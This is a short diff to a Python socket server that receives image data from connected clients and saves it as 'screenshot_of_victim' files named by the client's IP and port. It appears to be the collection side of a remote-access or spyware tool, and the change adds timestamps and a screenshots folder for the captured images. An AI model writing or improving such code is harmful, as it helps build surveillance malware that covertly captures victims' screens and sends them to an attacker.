@@ -3,7 +3,7 @@ import socket
 import threading
 import subprocess
 from queue import Queue
-
+from datetime import datetime
 
 messages_queue = Queue()
 
@@ -78,8 +78,9 @@ class Server:
         while connected:
             message = conn.recv(1024)
             if message:
-                f = open('screenshot_of_victim_'+str(addr[0])+'-'+str(addr[1])+'.png', 'wb')
-                while message:
+                now = datetime.now()
+                f = open('screenshots/screenshot_of_victim_'+str(addr[0])+'-'+str(addr[1])+'_'+str(now.strftime("%Y%m%d_%H-%M-%S"))+'.png', 'wb')
+                while len(message) == 1024:
                     f.write(message)
                     message = conn.recv(1024)
                 print("receiving finished")
